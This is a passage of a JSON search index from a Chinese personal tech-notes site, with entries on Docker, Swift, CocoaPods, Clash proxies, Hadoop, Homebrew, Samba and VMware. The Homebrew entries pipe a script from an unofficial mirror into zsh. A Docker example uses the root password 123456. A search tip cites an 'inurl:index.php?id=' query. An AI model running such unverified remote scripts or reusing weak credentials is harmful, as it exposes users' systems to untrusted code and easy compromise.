$image_name # 搜索镜像 docker search $image_name # 查看所有容器 # ps 查看运行中的docker docker ps -a # 删除容器 docker rm 容器id # 启动容器 docker start 容器id # 停止所有容器 docker stop $( docker ps -a -q ) # remove删除所有容器 docker rm $( docker ps -a -q ) # 重启容器 docker restart $image_name # 查看日志, 如查看mysql日志 docker logs -f mysql57 # 进入容器, 如进入mysql容器 # -t 在容器里生产一个伪终端 # -i 对容器内的标准输入 (STDIN) 进行交互 docker exec -ti mysql57 /bin/bash # 查看容器信息 docker inspect $image_name # 例子 docker run -p 3306 :3306 --name mysql57 \\ -v $PWD /conf:/etc/mysql \\ -v $PWD /logs:/var/log/mysql \\ -v $PWD /data:/var/lib/mysql \\ -e MYSQL_ROOT_PASSWORD = 123456 \\ -d mysql:5.7 \\ --character-set-server = utf8mb4 \\ --collation-server = utf8mb4_unicode_ci # 参数选项 –name：容器名, 比如mysql57 -v：挂载目录 -e：配置信息, 比如配置mysql的root用户的登陆密码 -p：端口映射, 比如映射 主机3306端口 到 容器的3306端口 -d：源镜像名, 比如为 mysql:5.7并后台运行 后面为设置mysql的默认编码","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-commonly-used-instructions.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-Docker-commonly-used-instructions.html"},{"title":"Docker命令大全","text":"","tags":"容器与集群","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-index.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-index.html"},{"title":"swift","text":"官网: https://www.swift.org 官网API文档: https://developer.apple.com/documentation/technologies 官网教程只有英文 一个用于在Apple设备上开发的语言 现在基本是 Object-C 后的接替了 安装 Mac上直接安装Xcode就行了, 自带Swift. 其他平台可参考: https://www.swift.org/install/ Swift内置了一个包管理, 能够更简单的导入, 包索引查询: https://swiftpackageindex.com 一些网站 民间(NGO, Non-Governmental Organization)中文社区: https://swiftgg.team 民间Swift语法中文版(相对更新慢一点): https://gitbook.swiftgg.team/swift/ 民间Swift 基本约定译文: https://github.com/SketchK/the-swift-api-design-guidelines-in-chinese 注解 swift 坑比较多, 资料也比较少... 打算做一个快捷键的, 东西太少 找到个可以借鉴的项目: git clone https://github.com/tkgka/Switcher.git git地址: https://github.com/tkgka/Switcher 注解 国内NGO就是社会组织 访问C头文件的几种方式 备注 对于MacOS 要使App全局显示, 只有设置 Info 为 Application is agent (UIElement) , 比如显示在其他全屏App上. 这是用其他语言暂时无法实现的... 单独的 Swift-View 如果要作为一个弹出窗体, 需要转换为 NSWindow 对于单独的 NSWindow , 直接给 delegate 会存在问题... 有个一直未解决的问题, 本地构建的App, 重新构建后, 识别不了上个版本获取的权限, 比如辅助功能...","tags":"后端; swift","url":"/yq-backend-swift.html","loc":"/yq-backend-swift.html"},{"title":"swift3.x升级到5.x","text":"先去 App Store 下载 Swiftify for Xcode : https://apps.apple.com/cn/app/swiftify-for-xcode/id1183412116?mt=12 先注册: https://swiftify.com/profile/api-key/ 主要是要获取一个API KEY 配置: 系统偏好设置 => \"扩展\"中为Xcode Source Editor(Xcode源码编辑器)选择\"Swiftyfy for Xcode\" 打开Xcode => Editor => 菜单下看到新的\"Swiftify\"子菜单 好吧不行, 坑, 这是 object-c => swift 的","tags":"后端; swift","url":"/yq-backend-swift-issuse-update.html","loc":"/yq-backend-swift-issuse-update.html"},{"title":"包管理工具pod(cocoapods)","text":"参考: https://juejin.cn/post/6932739864613879821 类似于Java的Maven 需要先有Ruby, 因为pod是用Ruby写的, 安装: gem install cocoapods pod setup 配置镜像 参考: https://mirrors.tuna.tsinghua.edu.cn/help/CocoaPods/ 内容: CocoaPods 是一个 Cocoa 和 Cocoa Touch 框架的依赖管理器，具体原理和 Homebrew 有点类似，都是从 GitHub 下载索引，然后根据索引下载依赖的源代码。 对于旧版的 CocoaPods 可以使用如下方法使用 tuna 的镜像： $ pod repo remove master $ pod repo add master https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git # 把所有上传到cocoapods的第三方框架下载每个版本和网络地址以及一些其他描述信息到本地 $ pod repo update 新版的 CocoaPods 不允许用pod repo add直接添加master库了，但是依然可以： $ cd ~/.cocoapods/repos $ pod repo remove master $ git clone https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git master 最后进入自己的工程，在自己工程的podFile第一行加上： source 'https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git' 克隆镜像有点慢, 我这花了9分半 Mac默认缓存位置是在: /Users/用户名/.cocoapods/repos 应该是pod转了一遍网络的原因, 导致github没有走clash的代理, 全局代理也无效; 只能手动配置一下了: git config --global http.https://github.com.proxy socks5://127.0.0.1:60742 还没试, 后面试试. 附, 恢复: git config --global --unset http.proxy 复制代码 git config --global --unset http.https://github.com.proxy 复制代码 使用 命令行方式: pod init 或者手动创建 Podfile : source 'https://mirrors.tuna.tsinghua.edu.cn/git/CocoaPods/Specs.git' platform :osx, '14.0' use_frameworks! target 'CQ' do pod 'KeyboardShortcuts', '~> 1.16.1' end 第一行指定源 后续安装直接: pod install 即可 注解 这里用的 KeyboardShortcuts 发现pod上面版本只有 0.7.1 , 太低了, 放弃 重要 使用pod的项目, 一定要使用 项目名.xcworkspace 打开, 才是 pod 的配置, 否则找不到pod安装的模块","tags":"后端; swift","url":"/yq-backend-swift-pod.html","loc":"/yq-backend-swift-pod.html"},{"title":"关于广告","text":"只谈近来, 去年用的三星手机, 虽然系统内广告较少, 但是这两年的三星, 没有12G的小体量运存, 然后导致我的这S22就发烫, 卡, 杀后台... 一年多后, 终于无法忍受, 千挑万选选了个RedMi K60, 16 + 256, 而且不超过2500就能拿到, 比跳水王三星好多了, 就是没三星好看. 如果三星今年的23有12G运存版本倒是可能会考虑降价后买... 可惜已经连续几年的没有了... 然后就理所当然的遭受了国产广告的侵扰, 最初本来打算从网络代理和安卓跳转监听API的两个方向来自己写程序处理, 还研究了一下, 最终决定使用Java开发, 再之后繁忙, 比如塞尔达, 比如工作啥的, 就搁置. 再之后想着, 这玩意儿不应该只有我想过, 有没有可以直接用的现成软件? 然后找到了AdGuard. AdGuard提供了两种: AdGuard 个人版使用, 收费, 个人版终身许可证189 AdGuard Home 这个稍微专业一点, 开源免费, 适用于家庭网络, 局域网, 可以理解作为一个网关, 然后局域网设备就 不用额外安装其他软件. 不过缺点是网关设备需要一直开机, 这个倒是可以考虑使用VPS解决. 地址: https://adguard.com/zh_cn/welcome.html https://adguard.com/zh_cn/adguard-home/overview.html 最初看到讨论是在 https://www.zhihu.com/question/482691819 注解 这是属于那种原理简单但是做起来比较复杂的那种, 比如如何判断哪些请求是属于广告访问, 所以有现成轮子可用何必自己再去搞.","tags":"杂乱无章","url":"/yq-doc-source-docs-Chaotic-About-advertising.html","loc":"/yq-doc-source-docs-Chaotic-About-advertising.html"},{"title":"Hadoop","text":"一个分布式框架， 该框架允许使用简单的编程模型跨计算机集群对大型数据集进行分布式处理。 它旨在从单个服务器扩展到数千台机器，每台机器都提供本地计算和存储。 库本身不用于依靠硬件来提供高可用性，而是被设计用来检测和处理应用程序层的故障， 因此可以在计算机集群的顶部提供高可用性服务，每台计算机都容易出现故障。 核心 HDFS 分布式文件系统, 对应Google的 GFS MapReduce 分布式计算框架, 对应Google的 MapReduce HBASE 实时分布式数据库, 对应Google的 BigTable HDFS结构 NameNode（名称节点） DataNode（数据节点） Client（客户机） NameNode 是Master节点（主节点），可以看作是分布式文件系统中的管理者， 主要负责管理文件系统的命名空间、集群配置信息和存储块的复制等。 NameNode会将文件系统的Meta-data存储在内存中， 这些信息主要包括了文件信息、每一个文件对应的文件块的信息和每一个文件块在DataNode的信息等。 DataNode 是Slave节点（从节点），是文件存储的基本单元， 它将Block存储在本地文件系统中，保存了Block的Meta-data，同时周期性地将所有存在的Block信息发送给NameNode。 Client 切分文件；访问HDFS；与NameNode交互，获得文件位置信息；与DataNode交互，读取和写入数据。 还有一个Block（块）的概念：Block是HDFS中的基本读写单元； HDFS中的文件都是被切割为block（块）进行存储的； 这些块被复制到多个DataNode中；块的大小（通常为64MB）和复制的块数量在创建文件时由Client决定。 MapReduce 注解 MapReduce 是面向磁盘的 MapReduce其实是一种编程模型。这个模型的核心步骤主要分两部分：Map（映射）和Reduce（归约）。 当你向MapReduce框架提交一个计算作业时，它会首先把计算作业拆分成若干个Map任务， 然后分配到不同的节点上去执行，每一个Map任务处理输入数据中的一部分， 当Map任务完成后，它会生成一些中间文件，这些中间文件将会作为Reduce任务的输入数据。 Reduce任务的主要目标就是把前面若干个Map的输出汇总到一起并输出。 在MapReduce里，为了完成上面这些过程，需要两个角色：JobTracker和TaskTracker。 JobTracker用于调度和管理其它的TaskTracker。JobTracker可以运行于集群中任一台计算机上。TaskTracker 负责执行任务，必须运行于 DataNode 上。 版本历史 2011年11月，Hadoop 1.0.0版本正式发布，意味着可以用于商业化。 但是，1.0版本中，存在一些问题： 扩展性差，JobTracker负载较重，成为性能瓶颈。 可靠性差，NameNode只有一个，万一挂掉，整个系统就会崩溃。 仅适用MapReduce一种计算方式。 资源管理的效率比较低。 所以，2012年5月，Hadoop推出了 2.0版本 。 2.0版本中，在HDFS之上，增加了YARN（资源管理框架）层。它是一个资源管理模块，为各类应用程序提供资源管理和调度。 参考: 深入浅出大数据：到底什么是Hadoop？","tags":"大数据","url":"/yq-doc-source-docs-Chaotic-Big-Data-Hadoop.html","loc":"/yq-doc-source-docs-Chaotic-Big-Data-Hadoop.html"},{"title":"大数据","text":"","tags":"大数据","url":"/yq-doc-source-docs-Chaotic-Big-Data-index.html","loc":"/yq-doc-source-docs-Chaotic-Big-Data-index.html"},{"title":"Android Studio","text":"将本地已有的Gradle配置到项目. Studio中的位置图示 安装Gradle可参考 /docs/后端/java/构建工具/gradle 注解 若build发现位置与配置的不一致, 关闭重新打开即可. 另Linux/Mac需要主要安装位置的权限问题","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Android_studio.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Android_studio.html"},{"title":"mac下应用运行管理","text":"前言 相关的指令 launchctl # 显示当前的启动脚本 launchctl list # 开机时自动启动Apache服务器 sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist # 设置开机启动并立即启动改服务 launchctl load -w **.pist # 设置开机启动但不立即启动服务 launchctl load **.pist # 停止正在运行的启动脚本 sudo launchctl unload [ path/to/script ] # 再加上-w选项即可去除开机启动 sudo launchctl unload -w [ path/to/script ] 注解 launchctl 管理 MacOS 的启动脚本, 控制启动计算机时需要开启的服务。也可以设置定时执行特定任务的脚本, 就像Linux cron一样。 launchctl需要 root 权限。 参考: MacOS launchctl 启动进程控制 使用 直接举例, 例如要停止Docker yanque@yanquedembp ~ % launchctl list | grep docker - 0 com.docker.helper 1333 0 application.com.docker.docker.25263488.25263866 yanque@yanquedembp ~ % launchctl stop application.com.docker.docker.25263488.25263866","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Application-operation-management-under-mac.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Application-operation-management-under-mac.html"},{"title":"Chrome开发者工具","text":"一般默认 F12 即可打开 标签 Elements 此界面显示 HTML 的渲染内容, 可 Ctrl/Cmd + F 在当前页面搜索 侧边还有样式显示, 计算显示 Console 控制台, 在此界面 可 Ctrl/Cmd + Shift + F 全局搜索字符串; Ctrl/Cmd + O 或者 Ctrl/Cmd + P ，可以呼出一个文件列表窗口， 输入关键词，可以搜索到 文件名包含这个词的文件 Network 网络连接 一些快捷键 Ctrl/Cmd + Shift + P 打开一个运行命令的窗口; 可直接上下键选择打开哪一个标签页 Esc 显示/隐藏当前标签页抽屉栏, 只在控制台跟源代码标签页用过. 也可直接单击设置选择:","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-Chrome-developer-tool.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-Chrome-developer-tool.html"},{"title":"Chrome搜索技巧","text":"site 指定搜索时(不)查询某个域名(比如csdn): 今日大瓜 -site:csdn.net 说明: 无空格是不搜索指定域名 -site:csdn.net 有空格是仅搜索指定域名 -site: csdn.net 无 - 时, 不管有无空格, 都是仅搜索指定域名 site: csdn.net , site:csdn.net intitle 网页 标题 必须包含的内容: intitle:今日大瓜 intext 网页 内容 (正文)必须包含的内容: intext:今日大瓜 inurl 地址必包含的url, 如: inurl:index.php?id= filetype 文件类型: filetype:pdf","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-Chrome-search.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-Chrome-search.html"},{"title":"Chrome","text":"","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-index.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-index.html"},{"title":"mac下chrome快捷键","text":"Mac 下 Chrome 浏览器 快捷键","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-shortcut-key-under-mac.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Chrome-shortcut-key-under-mac.html"},{"title":"clash等代理问题","text":"关于普通版clash的代理问题 规则: 你购买的节点代理商那边有一个分流规则, 一般是国内的网站不走代理, 国外的网站走代理 全局: 全部都走代理 注解 这里的全局代理的意思并不是你设备上的所有软件都可以使用这个代理, 而是指你 通过代理访问的所有网站都不进行分流 如果想要设备上其他软件走代理, 要看此软件是否支持了, 有的可以手动在相应的软件内配置代理, 配置自动识别手动指定等. 比如需要用到yarn下载包, 命令行配置下本地clash代理地址即可: yarn config set proxy http://127.0.0.1:7890 对于不支持的, 那就只有不用或者用 Proxifier 强制指定了(付费软件, 暂未用过)","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-Clash-and-other-agency-issues.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-Clash-and-other-agency-issues.html"},{"title":"clash各版本备份","text":"源于别的UP. 视频说明: https://www.youtube.com/watch?app=desktop&v=e3QVBWDJREM 文章地址: https://duangks.com/archives/152/ 备份地址1-谷歌云: https://drive.google.com/drive/folders/1dmyLaj4L4x2Nz-P5n-rozcgCa9Ip4qJ_ 备份地址2-alist云盘: https://alist.duangks.com","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-Clash-record.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-Clash-record.html"},{"title":"设置应用全局","text":"我们通常所说的全局模式, 指的是 使用浏览器访问某个地址时, 使用代理地址访问 . 而 规则模式 是, 仅对匹配名单的地址使用代理. 而系统的其他App能否正常访问代理, 得看应用自己有没有提供 自动识别代理的功能. 对于MacOS, 直接使用 ClashX Pro 即可, 打开 使用增强模式 功能 即可对全局App使用代理 下面主要介绍Windows. 安装虚拟网卡服务 打开Clash主界面, 安装服务模式, 安装服务模块 安装好后图中圈出位置会显示: 当前状态: 已激活 打开TUN模式 在 系统代理 打开的情况下, 打开 TUN模式 成功后还可以看到有这个","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-Set-the-overall-application.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-Set-the-overall-application.html"},{"title":"Clash","text":"","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-index.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-index.html"},{"title":"mac下clash x共享代理","text":"在已安装clash x 且能够开启代理的机器上, 菜单栏点开clash x, 设置允许局域网连接 允许局域网连接 在另一个需要连接的设备设置http代理, ip为安装clash x机器的ip 端口为 7890 (mac默认是这个, win貌似可以自己设置)","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-mac_clashx-sharing-agent.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Clash-mac_clashx-sharing-agent.html"},{"title":"文件格式-toml","text":"一般都是这么写的: [data1] key1 = v1 key2 = v2 相当于定义了一个名为data1的字典. 那如果key1的值是字典呢? 目前为止只知道一个可以 单行 字典定义: [data1] key1 = {name='bob', age=20} key2 = v2","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-File-format-TOML.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-File-format-TOML.html"},{"title":"idea快捷键","text":"mac与windows Idea 快捷键(与自家同系列其他产品大部分通用) Mac 作用 Windows Option + 方向上 选中当前光标所在字符串. 多次点击扩大范围 Ctrl + W Option + 方向下 与上一个相反. 可以在上面基础上缩小选择范围 Ctrl + Shift + W Option + 回车 显示上下文操作 Option + F7 查看所有声明或者调用(下方窗口) Option + Shift + 方向上 将当前行上移(调换位置) Option + Shift + 方向下 将当前行下移(调换位置) Control + 空格 显示补全建议. 选中后使用 tab 键可以完美替换后面的字符串 使用 return 是插入 Control + G 选择光标处字符串. 可多次点击选中下一个位置相同字符串. 可加 Shift 键. 取消多次选择的内容 Control + T 预览光标位置或选中区域的可重构选项 Control + Command + G 选中当前文件中所有与当前光标所在字符串一样的字符串 Control + Shift + 空格 显示建议的补全(根据当前上下文) Shift + F6 重命名光标所在字符串 Command + D 复制当前行 Command + del 删除当前行. del就是键盘右上角那个删除的叉. 在window键盘上backspace位置 Command + / 单行注释 Command + - 英文减号位置. 缩起当前代码段 Command + = 等号位置. 展开当前代码段 Command + P 查看方法签名. 形参信息 Command + Y 查看文本光标处符号定义. 如方法定义 Command + F1 查看警告说明. 再次点击查看详细说明 Command + F 当前文件查找 Command + F12 主窗体查看当前文件结构 Command + 7 打开文件结构小窗口 Command + B 跳转到方法声明/查看所有用法 Command + U 查看当前方法的父类声明 Command + E 查看最近打开的文件 Command + 9 预览git提交时间线 Command + L 手动输入 跳转到行 Ctrl + G Command + Option + / 多行注释(python没有. java才有) Command + Option + T 使用模版来环绕所选代码段. 比如if. try语句 Command + Option + V 替换局部变量. 需要先选中 Command + Option + L 格式化代码. 若有选中格式化选中代码. 若无选中则格式化全文代码. 加 Shift 可以自定义格式化选项 Command + Option + B 查看所有实现 Command + Shift + 回车 补全当前行所在语句 Command + Shift + 方向上 将当前方法与上一个方法调换. 注意光标需要在方法标头处 Command + Shift + 方向下 将当前方法与下一个方法调换. 注意光标需要在方法标头处 Command + Shift + - 英文减号位置. 缩起当前文件所有代码段 Command + Shift + = 等号位置. 展开当前文件所有代码段 Command + Shift + M 将所选代码块提取到方法 Command + Shift + F7 高亮显示所选文本的所有用法 Command + Shift + F 所有文件中查找 Command + Shift + H 查看方法的层次结构. 比如继承的树形图 Command + Shift + E 查看最近打开的文件中的修改 ESC 关闭主窗口区域的弹出窗口 Shift + ESC 关闭非主窗口弹出窗口 F1 查看文本光标处符号文档 F2 转到文件中下一个现实高亮的错误","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-IDEA-shortcut-key.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-IDEA-shortcut-key.html"},{"title":"mac的包管理器brew","text":"自从升级到macos13之后, 使用brew下载就非常的慢, 稍微看了一下输出, 大概是国内源没有13版本的包, 所以最后还是去外面下载... 于是, 就找了一下有没有处理办法. mac下包管理器最常用的有brew与macport, 网上说后者的包要多很多. 这里只谈brew, 官网: https://brew.sh/index_zh-cn 安装brew 国内源下载: /bin/zsh -c \"$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)\" 把脚本搞下来了, /resources/code/homebrew_zh.sh 一开始用的2清华源, 结果慢的要死. 然后换成1中科大的源, 快多了 卸载brew 卸载脚本: /bin/zsh -c \"$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/HomebrewUninstall.sh)\" 同样拉下来了, /resources/code/homebrew_uninstall_zh.sh 一些说明 brew Homebrew 源代码仓库 homebrew-core Homebrew 核心软件仓库 homebrew-bottles Homebrew 预编译二进制软件包 homebrew-cask MacOS 客户端应用 Homebrew国内镜像源目前主要有中科大镜像、阿里镜像、清华镜像。 指令说明 查看brew.git源: cd \"$(brew --repo)\" && git remote -v 查看 homebrew-core.git 当前源: cd \"$(brew --repo homebrew/core)\" && git remote -v 常见报错 Command failed with exit 128: git 详细报错: fatal: not in a git directory Error: Command failed with exit 128: git 因为brew软件仓库实际是使用git来进行管理的, 所以会去本地的仓库目录 去找, 但是它又不是一个git仓库. 解决办法: 找到本地的安装仓库目录, 然后使用: git config --global --add safe.directory 目录 即可. 如果不知道自己安装在哪了, 可以使用find查找: yanque@yanquedembp ~ % find / -name \"homebrew\" 2>/dev/null /usr/local/Homebrew/Library/Taps/homebrew 然后看看有哪些: yanque@yanquedembp ~ % ls /usr/local/Homebrew/Library/Taps/homebrew homebrew-cask homebrew-core homebrew-services 然后加进去: yanque@yanquedembp ~ % git config --global --add safe.directory /usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask yanque@yanquedembp ~ % git config --global --add safe.directory /usr/local/Homebrew/Library/Taps/homebrew/homebrew-core yanque@yanquedembp ~ % git config --global --add safe.directory /usr/local/Homebrew/Library/Taps/homebrew/homebrew-services 试过不支持通配符.","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Mac's-bag-manager-Brew.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Mac's-bag-manager-Brew.html"},{"title":"StarWindConverter","text":"将 img 镜像转换为 Wmvare 可用的虚拟机文件 官网下载地址: https://www.starwindsoftware.com/starwind-v2v-converter#download 需要填写信息, 然后会给你发邮件, 下载地址在邮件里面, 我的是: https://www.starwindsoftware.com/tmplink/starwindconverter.exe 不知道是不是每人都一样 安装好之后使用, 选择需要转换的镜像 选择转换的目标 这里好像任意都可, 我选的第一个 然后 转换 如果有这个报错, 说明路径有中文, 换个路径就行","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-StarWindConverter.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-StarWindConverter.html"},{"title":"终端工具","text":"这里不得不提一下: /docs/操作系统/linux/概念性/终端 tty console区别","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Terminal-tool.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Terminal-tool.html"},{"title":"使用samba实现win10映射磁盘驱动访问linux","text":"安装 安装samba: sudo apt install samba 这里可能会提示获取dhcp的配置信息，以及安装dhcp-client客户端，确认就好 配置 samba的配置文件一般在: /etc/samba/smb.conf 简单配置smb.conf: sudo vim /etc/samba/smb.conf 最后添加配置信息, 如: [user] #共享名称database comment = \"comment\" # 描述信息 path = /tmp/user1 # 共享目录 public = no # 关闭所有人可见 writable = yes # 是否有写权限 自己机器的配置: [luyi] comment = \"luyi\" path = /home/luyi writable = yes 添加用户 添加用户并设置密码: pdbedit -a luyi 最后打开win10的计算机映射网络驱动器 警告 使用 pdbedit 新建的用户名, 必须是当前系统已存在的用户名. over 注解 lz使用的是debian10，samba版本为4.9.5-debian，samba服务名为smbd. 所以启动之类的需要 service smdb start，之前用samba tab出来的一直报错找了半天原因...... 虚拟机要保证跟宿主机之间可以相互ping通 win10宿主机建议开启以下配置： 我的电脑右键 --> 管理 --> 服务和应用程序 --> 服务, 找到TCP/IP NetBIOS Helper，将启动类型修改为自动并且启动它 安装虚拟机，还是使用workstation吧，vitrualbox一直有问题，后续版本还跟win10不兼容 资料了解 Samba是一个能让Linux系统应用Microsoft网络通讯协议的软件， 而SMB是Server Message Block的缩写，即为服务器消息块 ， SMB主要是作为Microsoft的网络通讯协议，后来Samba将SMB通信协议应用到了Linux系统上， 就形成了现在的Samba软件。后来微软又把 SMB 改名为 CIFS（Common Internet File System）， 即公共 Internet 文件系统，并且加入了许多新的功能，这样一来，使得Samba具有了更强大的功能。 主要配置介绍 配置文件的大概组成global、homes、printers global global定义全局的配置: [global] workgroup = MYGROUP # 工作组，按win下的理解即可 # win默认为WORKGROUP server string = Samba Server Version %v security = user # security默认(user)用户级别， # 详见下关于security级别 passdb backend = tdbsam # passdb backend （用户后台）， # samba有三种用户后台： # smbpasswd, tdbsam和ldapsam # 详见下关于samba三种用户后台 load printers = yes # 设置打印机相关 cups options = raw # 设置打印机相关 masks = 0700 # 设置文件掩码, 如700表示新建文件的权限, global其他的参数: netbios name = MYSERVER # 设置出现在\"网上邻居\"中的主机名 hosts allow = 127. 192.168.12. 192.168.13. # 用来设置允许的主机，如果在前面加\";\"则表示允许所有主机 log file = /var/log/samba/%m.log # 定义samba的日志，这里的%m是上面的netbios name max log size = 50 # 指定日志的最大容量，单位是K homes homes是共享用户自己的家目录, 针对共享目录个别的设置，只对当前的共享资源起作用, 也就是说，当用户登录到samba服务器上时实际上是进入到了该用户的家目录， 用户登陆后，共享名不是homes而是用户自己的标识符，对于单纯的文件共享的环境来说，这部分可以注视掉: [homes] comment = Home Directories browseable = no writable = yes mask = 0700 # 设置文件掩码, 如700表示新建文件的权限, 警告 再次申明, 此处的 homes 表示用户名, 比如我系统有一个 luyi 用户, 那么 使用 pdbedit命令 创建的用户也需要是 luyi pdbedit -a luyi 这里的 homes 的值也为 luyi [luyi] comment = \"luyi\" path = /home/luyi writable = yes ... 表示针对 luyi 这一个用户做更详细的配置. printers printers设置该部分内容设置打印机共享: [printers] comment = All Printers path = /var/spool/samba browseable = no guest ok = no writable = no printable = yes 关于security级别 安全级别解析： share模式：不用进行权限匹配检查即可访问共享资源，安全性比较差； user模式：需要对用户名和密码进行验证，通过后才能访问共享资源，具有一定的安全性； server模式：通过指定的服务器对用户名和密码进行验证，如果不通过，客户端会用user级别访问； domain模式：domain级别的Samba服务器只作为域的成员客户端加入Windows域中，由Windows域控制器来完成对用户名和密码的验证； ads模式：如果Samba服务器以ads方式加入Windows域中，将具备domian级别的所有功能，并且可以完成对用户名和密码的验证工作。 关于samba三种用户后台 smbpasswd 该方式是使用smb工具smbpasswd给系统用户（真实用户或者虚拟用户）设置一个Samba 密码， 客户端就用此密码访问Samba资源。smbpasswd在/etc/samba中，有时需要手工创建该文件: -a: 添加 -x: 删除 -d: 禁用 -e: 启用 -L: 列出相关信息 -v: 与L搭配使用，列出更多信息 -w: 搭配L，使用旧版格式 -r: 修改一个账户的相关信息 -m: 后接机器代码(machine account)，与 domain model 有关！ tdbsam 使用数据库文件创建用户数据库。 数据库文件叫passdb.tdb，在/etc/samba中。 passdb.tdb用户数据库可使用smbpasswd –a创建Samba用户，要创建的Samba用户必须先是系统用户。 也可使用pdbedit创建Samba账户。pdbedit参数很多，列出几个主要的: pdbedit –a username：新建Samba账户。 pdbedit –x username：删除Samba账户。 pdbedit –L：列出Samba用户列表，读取passdb.tdb数据库文件。 pdbedit –Lv：列出Samba用户列表详细信息。 pdbedit –c \"[D]\"–u username：暂停该Samba用户账号。 pdbedit –c \"[]\"–u username：恢复该Samba用户账号。 ldapsam 基于LDAP账户管理方式验证用户。首先要建立LDAP服务， 设置: passdb backend = ldapsam:ldap://LDAP Server pdbedit命令 pdbedit 参数及功能：pdbedit命令是samba的用户管理命令 参数 作用 -a user 建立samba的用户user -r user 修改samba的用户user -x user 删除samba的用户user -L 列出用户列表 -Lv 列出用户详细信息的列表 -c \"[D]\" -u user 暂停该samba用户user -c \"[D]\" -u user 恢复该samba用户user 注解 使用pdbedit创建好用户后, 输出会提示链接的网络路径.","tags":"常用工具使用","url":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Use-Samba-to-implement-the-win10-disk-drive-to-access-Linux.html","loc":"/yq-doc-source-docs-Chaotic-Commonly-used-tools-Use-Samba-to-implement-the-win10-disk-drive-to-access-Linux.html"},{"title":"VMware 三种网络模式","text":"参考: https://www.cnblogs.com/pipci/p/12271190.html https://wenku.baidu.com/view/7d6f1a3f084e767f5acfa1c7aa00b52acfc79c1d 网卡、路由器、交换机 网卡 是电脑内置的硬件，一般的笔记本会有两个网卡: 以太网网卡，有线上网用 Wi-Fi网卡，无线上网使用。 Windows 网络适配器 路由器 一般有几个功能，第一个是网关，控制下行网络。第二个是扩展有线网络端口，比如家里有四个房间，每个房间都要有一个网口。第三个是WiFi功能，可以接入无线设备。 交换机 一般只有扩展有线网络端口一个功能，也就是说可以把局域网的电脑组建成一个网络。 如果只有交换机没有路由器是不能上网的。 最后：我们看下总体的网络结构图：交换机是用来扩展接口，或者把局域网的电脑连接到一个网络环境用的。路由器帮我们连接到互联网。 网络结构图 虚拟网络编辑器 首先，虚拟机有三个虚拟交换机，分别对应于三种模式。 三个虚拟机交换机 虚拟交换机种类 虚拟交换机 用途 VMnet0 桥接模式 VMnet1 仅主机模式 VMnet8 NAT模式 注意，名字短的是虚拟机交换机。 因为我们前面讲过了，交换机的作用是扩展接口或者组网，所以这些虚拟机交换机的作用就是让相同网络模式的虚拟机能够相互连接。 另外，安装Vmware软件的时候，它还在我们的物理机里面安装了两个虚拟网卡。 虚拟网卡 虚拟网卡 虚拟网卡名称 用途 VMware Network Adapter VMnet1 仅主机模式 VMware Network Adapter VMnet8 NAT模式 名字长的是虚拟网卡。 虚拟网卡，是物理机使用的，用来连接到虚拟交换机，和虚拟机连接。 为什么没有vVMware Network Adapter VMnet0呢？这个我们我们后面来解答。 注意，一个机器可以同时使用多种网络模式，也就是使用多个虚拟网卡。 使用多种网络模式 比如一台虚拟机，同时需要有内网IP和外网IP，就可以添加两个网络适配器。 对于这三种网络模式，我们最重要的是解决两个问题： 在不同的网络模式下： 1、主机怎么和虚拟机连接？ 2、虚拟机怎么连接到互联网？ 网络模式 桥接模式 桥接模式 通信方式 